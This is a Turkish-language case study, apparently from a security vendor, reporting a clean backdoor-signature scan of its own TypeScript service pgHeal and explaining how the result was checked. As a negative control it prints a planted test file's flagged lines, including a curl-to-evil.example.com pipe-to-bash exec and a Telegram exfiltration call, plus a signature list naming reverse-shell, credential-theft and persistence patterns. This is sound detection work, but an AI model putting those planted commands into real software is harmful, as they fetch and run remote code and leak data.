# AEGISFORGE VAKA ÇALIŞMASI #3 — pgHeal: TypeScript Servis Kaynak Taraması

**Tarih:** 2026-09-25  
**Motor:** CleanAudit v0.4.0 (kaynak imza tarayıcısı + PoV_Hash commitment)  
**Kanal:** `aegisforge scan --src-dir <proje-kökü> --tier scan`  
**LE-3 kuralı uyarınca PUBLİK** — çıkar-çatışması kalkanı

---

## Özet

CleanAudit'u **kendi portföyümüzden bir hizmette** çalıştırdık: pgHeal — PostgreSQL
otonom indeks ve PR robotu. Sonuç: **TEMİZ** — 57 kaynak dosyasında 0 backdoor imzası,
**CleanScore 100/100 (AAA)**.

Bu vaka çalışması, sıfır-bulgulu sonucun **nasıl kanıtlandığını** ve — daha önemlisi —
vaka #2'in %90 yanlış-pozitif dersinin bu çalışmada **nasıl uygulandığını** belgeler.
Çünkü "temiz" bir sonucun değeri, tarayıcının sahte bir "temiz" üretmediğine
inandıran kontrolere bağlıdır.

### Kısıt (açıkça belirtilmelidir)

**Sözleşme kademesi bu hedefe uygulanabilir değildir.** pgHeal bir TypeScript
hizmetidir — derlenmiş EVM bytecode'u yoktur, supply/balance muhasebesi yoktur,
likidite havuzu yoktur. Bu nedenle yalnızca **kaynak-dosya imza taraması** koşuldu:

| Kademe | Durum |
|---|---|
| Stage 1 (Z3 SMT invariant) | **uygulanabilir değil** — akıllı-sözleşme muhasebesi yok |
| Stage 2 (metamorfik fuzz) | **uygulanabilir değil** — yarışacak vault durumu yok |
| Stage 3 (tokenomics) | **uygullanabilir değil** — token veya likidite havuzu değil |
| Stage 4 (EVM bytecode stealth) | **uygulanabilir değil** — hedef EVM bytecode değil |
| Stage 5 (kaynak imza taraması) | **KOŞULDU** — 57 dosya |

Rapor, bu kısıtı `applicability` alanında her taramada açıkça belirtir. Bir
sahnenin hiç çalışmadığı durumda "0 bulgu" rapor etmek, sessizce "temiz" demekten
farklıdır — bu fark vaka #2'den öğrenildi.

## Tarama Sonuçları

| Hedef | CleanScore | Dosya | Bulgu | PoV_Hash |
|---|---|---|---|---|
| pgHeal `src/` + `test/` + kök | **100/100 (AAA)** | 57 | **0** (0 critical / 0 high / 0 medium) | `0xde843be7…518a384e` |

**Hedef kimliği (tree hash):** `0xe924a0ef7acfe04324bdba6d9f7b9958fe85902cc5f8abeef97573cbca396c81`

**Komut (üçüncü taraf reprodüksiyonu):**
```bash
aegisforge scan --src-dir <pgheal-kökü> --tier scan --timestamp 1790304944
```

## Kanıt: Neden "Temiz" Sonuç Güvenilir

Sıfır-bulgulu bir rapor, tarayıcının her şeyi atladığı anlamına gelebilir.
Üç kontrol bunu dışlar:

### 1. Negatif kontrol — plant'lı backdoor tespit edildi

Aynı tarayıcı, pgHeal'in `config.ts` dosyasının yanına plant'lı bir
`telemetry.ts` koyduğumuzda **üç geri kapı işaretinin de tamamını** yakaladı:

```
[CRITICAL] AF-SRC-002 telemetry.ts:2 — fetch("https://api.telegram.org/bot1:AAA/sendMessage", ...)
[CRITICAL] AF-SRC-003 telemetry.ts:3 — require("child_process").exec(`curl http://evil.example.com/x.sh | bash`)
[    HIGH] AF-SRC-009 telemetry.ts:4 — const key = "AKIA1234567890ABCDEF";
```

CleanScore **0/100**. Yani tarayıcı boş bir cevap kümesi döndürmüyor; pgHeal'de
bu işaretlerden gerçekten hiçbiri yok.

### 2. Yanlış-pozitif tuzağı yakalandı ve kapatıldı

İlk tarama **1 CRITICAL** üretti: `install.sh:3`'te `curl ... | sh`.

**Bu yanlış-pozitifti.** İlgili satır:

```sh
#   curl -fsSL https://raw.githubusercontent.com/goun7/pgheal/master/install.sh | sh
```

Satır `#` ile başlıyor — **yorum satırı**, alternatif kurulum komutunu gösteren
dokümantasyon. Gerçek `install.sh` GitHub Releases'ten bir `.tgz` indirir ve
`npm install -g` ile kurar — pipe-to-shell içermez.

Bu, vaka #2'nin tam olarak aynı failure mode'idur: bir imza, koda değil
**proseye** ateş etti. Düzeltme uygulandı: tam-satır `#` yorumları artık
taradan önce atılıyor (mid-line `#` korunur — sed onu sınırlayıcı olarak
kullanır) ve URL şemalarındaki `//` artık yorum olarak kesilmiyor (bu ikinci
hata, `https://` içeren her satırı truncating ederek bir **tespit açığı**ydı).

**Regresyon testi eklendi** (`hashed_out_command_does_not_fire`), böylece bu
hata kalıcı olarak kapatıldı.

### 3. Determinizm — commitment reprodükabl

Aynı ağaç + aynı salt + aynı timestamp ⇒ **byte-identical PoV_Hash**. İki kez
koşturuldu, sonuç özdeş. Domain doğrulaması: hem `--salt` hem `--timestamp`
commitment'ı değiştirir (lib seviyesinde test edildi).

## Signature Kataloğu (vaka #3'de koşan)

Tarayıcı yüksek hassasiyet için kısa tutuldu — vaka #2'nin dersi: elli gürültülü
imza, beş sinyal-zengin imzadan daha kötüdür.

| Kimlik | Sınıf | Seviye |
|---|---|---|
| AF-SRC-001 | reverse-shell (`bash -i`, `/dev/tcp/`) | critical |
| AF-SRC-002 | exfil-endpoint (Telegram/Discord webhook) | critical |
| AF-SRC-003 | pipe-to-shell (`curl ... \| sh`) | critical |
| AF-SRC-004 | dynamic-exec (`eval(\``, `new Function(`) | high |
| AF-SRC-005 | persistence (`authorized_keys`, `crontab -e`) | high |
| AF-SRC-006 | credential-file-read (`.npmrc`, `.aws/credentials`) | medium |
| AF-SRC-007 | obfuscation (`atob(`) | medium |
| AF-SRC-008 | miner-or-c2 (`stratum+tcp`, `.onion/`) | medium |
| AF-SRC-009 | cloud-key-literal (AKIA/ghp_/PEM — format doğrulamalı) | high |

**Yanlış-pozitif disiplini:** `process.env.X` okumaları asla ateşlemez — sırlar
env'de olmalıdır. "token isimli değişken" ile "hardcoded token literal" arasındaki
ayrım, çevresleyen tırnaklarla ve format doğrulamayla yapılır.

## LE-3 Çıkar-Çatışması Kalkanı Kanıtı

pgHeal **kendi portföyümüzdendir** (09_pgHeal). LE-3 kuralı uyarınca, kendi
portföyümüz için "temiz" sonucu yayınlamak, **çalışan kalkanın kanıtıdır**:
sonuç ne olursa olsun yayınlanır — temiz çıkarsa "temiz", bulgu çıkarsa "bulgu".

Bu vakada sonuç temizdir ve yukarıdaki üç kontrol, bu "temiz"liğin bir
tarayıcı hatasından değil, imza katalogunun bu kod tabanında ateşleyecek
bir şey bulamamasından kaynaklandığını gösterir.

## Dürüst Sınırlar (her raporda belirtilir)

- Kaynak imza taraması **statik bir bulgudur**: formal doğrulama, taint analizi
  veya "kod güvenlidir" iddiası değildir.
- **"0 bulgu" = "bilinen backdoor imzası ateşlemedi"**, başka bir şey değildir.
- Sıfır-bulgulu bir hizmet hala runtime'da tehlikeli konfigürasyon, sızmış
  bağımlılık veya insan hatası içerebilir. Bu rapor **ölçüm** raporudur,
  garanti değildir — CleanScore disclaimer'ında belirtildiği gibi sorumluluk
  ödenen denetim ücreti ile sınırlıdır.

## Teknik Ek

**Yeni yetenek:** `--src-dir` modu, kaynak ağaçları için `tree_hash` üretir
(açıklayan dosyaların + içeriklerinin sıralanmış SHA-256'sı), böylece PoV_Hash
commitment'ı kaynak projeler için de üçüncü tarafça reprodükabl olur.

**vaka #2 dersinin Stage-1'e uygulanması:** abstraction doğrulama adımı eklendi.
Artık Stage-1 raporu, hedefin **modelin varsaytığı muhasebe yüzeyine sahip
olup olmadığını** selector taramasıyla belirler (`vault-shaped` /
`token-shaped` / `weak-match` / `no-match`). Hedef yanlış sınıftan olduğunda
model "proven" yerine anlamsız sonuç üretür — vaka #2'de tam olarak bu oldu
(ERC-4626 modeli saf ERC-20 hedefe uygulandı). Artık bu durum raporda
açıkça belirtiliyor. Doğrulama: AcmeVault → `vault-shaped`, minimal bytecode →
`no-match`.
